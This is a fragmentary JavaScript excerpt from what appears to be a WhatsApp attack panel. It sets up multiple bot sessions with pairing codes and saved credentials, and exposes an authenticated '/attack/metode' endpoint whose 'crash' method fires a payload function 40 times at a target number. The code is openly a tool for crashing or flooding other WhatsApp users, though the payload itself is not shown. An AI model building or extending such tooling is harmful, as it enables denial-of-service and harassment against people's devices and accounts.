...
const initializeWhatsAppConnections = async () => {
  ...
  for (const botNumber of activeNumbers) {
    ...
    await new Promise((resolve, reject) => {
      revinza.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        if (connection === "open") {
          console.log(`Bot ${botNumber} connected!`);
          sessions.set(botNumber, revinza);
          return resolve();
        }
        if (connection === "close") {
      ...
      revinza.ev.on("creds.update", saveCreds);
    });
  }
};
  ...
  revinza.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "connecting") {
      if (!fs.existsSync(`${sessionDir}/creds.json`)) {
        setTimeout(async () => {
          try {
            const code = await revinza.requestPairingCode(botNumber);
...
app.get("/attack/metode", requireAuth,  async (req, res) => {
  try {
    ...
    switch (metode.toLowerCase()) {
      case "crash":
        for (let i = 0; i < 40; i++) {
          await payXgtw(revinza, isTarget);
        }
        break;
